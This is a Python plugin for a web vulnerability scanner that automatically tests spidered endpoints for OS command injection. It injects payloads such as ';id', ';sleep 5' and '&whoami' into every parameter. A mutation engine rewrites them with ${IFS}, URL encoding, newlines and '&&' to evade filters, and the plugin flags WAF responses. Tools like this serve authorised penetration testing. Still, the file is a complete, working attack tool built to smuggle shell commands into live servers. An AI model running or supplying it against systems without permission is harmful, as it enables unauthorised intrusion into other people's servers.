import requests
import time
import re
import random

NAME = "cmdinj"
CATEGORY = "vuln"
DESCRIPTION = "Advanced Command Injection Scanner (Rule-based + Mutation Engine + Auto Spider Mode)"

# =====================================================
# Payload Rules (Core Injection Logic)
# =====================================================

INJECTION_RULES = [
    {
        "name": "linux_output",
        "payload": ";id",
        "detect": lambda r: "uid=" in r.text.lower()
    },
    {
        "name": "linux_time",
        "payload": ";sleep 5",
        "detect_time": 5
    },
    {
        "name": "windows_output",
        "payload": "&whoami",
        "detect": lambda r: "\\" in r.text or "administrator" in r.text.lower()
    },
    {
        "name": "windows_time",
        "payload": "&timeout /t 5",
        "detect_time": 5
    }
]

# =====================================================
# Mutation Engine
# =====================================================

def mutate_payload(payload):
    mutations = [
        payload,
        payload.replace(" ", "${IFS}"),
        payload.replace(";", "%3B"),
        payload.replace(" ", "%20"),
        payload.upper(),
        payload.replace(" ", "`echo${IFS}`"),
        payload.replace(";", "\n"),
        payload.replace(";", "&&"),
    ]
    return list(set(mutations))

# =====================================================
# Core Scanner
# =====================================================

class CmdInjEngine:

    def __init__(self, target, emit, spider_results=None):
        self.target = target
        self.emit = emit
        self.session = requests.Session()
        self.spider_results = spider_results

        self.intel = {
            "vulnerabilities": [],
            "signals": []
        }

    # -------------------------------------------------
    # WAF Detection
    # -------------------------------------------------

    def detect_waf(self, response):
        waf_keywords = ["blocked", "firewall", "mod_security", "cloudflare"]
        if response.status_code in [403, 406, 503]:
            return True
        for k in waf_keywords:
            if k in response.text.lower():
                return True
        return False

    # -------------------------------------------------
    # Scan Single Endpoint
    # -------------------------------------------------

    def scan_endpoint(self, method, url, params):

        self.emit.info(f"Testing {method} {url}")

        try:
            baseline = self.session.request(method, url, timeout=5)
            baseline_time = baseline.elapsed.total_seconds()
        except:
            return

        for rule in INJECTION_RULES:
            for payload in mutate_payload(rule["payload"]):

                injected_params = {}
                for p in params:
                    injected_params[p["name"]] = payload

                try:
                    start = time.time()
                    r = self.session.request(method, url,
                                             params=injected_params if method == "GET" else None,
                                             data=injected_params if method == "POST" else None,
                                             timeout=10)
                    elapsed = time.time() - start

                    if self.detect_waf(r):
                        self.intel["signals"].append("WAF_DETECTED")
                        continue

                    # Output-based detection
                    if "detect" in rule and rule["detect"](r):
                        self.intel["vulnerabilities"].append({
                            "url": url,
                            "method": method,
                            "payload": payload,
                            "type": rule["name"],
                            "confidence": "HIGH"
                        })

                    # Time-based detection
                    if "detect_time" in rule:
                        if elapsed > baseline_time + rule["detect_time"] - 1:
                            self.intel["vulnerabilities"].append({
                                "url": url,
                                "method": method,
                                "payload": payload,
                                "type": rule["name"],
                                "confidence": "MEDIUM"
                            })

                except:
                    continue

    # -------------------------------------------------
    # Auto Mode (Spider Integration)
    # -------------------------------------------------

    def auto_scan_from_spider(self):

        if not self.spider_results:
            self.emit.warn("No spider intel found.")
            return

        endpoints = self.spider_results.get("intel", {}).get("endpoints", [])

        if not endpoints:
            self.emit.warn("Spider found no endpoints.")
            return

        for ep in endpoints:
            method = ep.get("method", "GET")
            url = ep.get("url")
            params = ep.get("params", [])

            if params:
                self.scan_endpoint(method, url, params)

    # -------------------------------------------------
    # Run
    # -------------------------------------------------

    def run(self, auto=False):

        if auto:
            self.emit.info("Auto mode enabled (Using Spider Intel)")
            self.auto_scan_from_spider()
        else:
            self.emit.warn("Manual mode requires endpoint support (Coming soon)")

        if self.intel["vulnerabilities"]:
            self.intel["signals"].append("CMD_INJECTION_DETECTED")

        return {
            "raw": f"Vulns: {len(self.intel['vulnerabilities'])}",
            "intel": self.intel
        }

# =====================================================
# Entry Point (Framework Hook)
# =====================================================

def run(target, emit, options=None):

    emit.info(f"Starting CMD Injection scan on {target}")

    auto = False
    spider_results = None

    if options:
        auto = options.get("auto", False)
        spider_results = options.get("spider_results")

    engine = CmdInjEngine(target, emit, spider_results)
    result = engine.run(auto=auto)

    emit.success("CMD Injection scan complete.")
    emit.success(result["raw"])

    return result
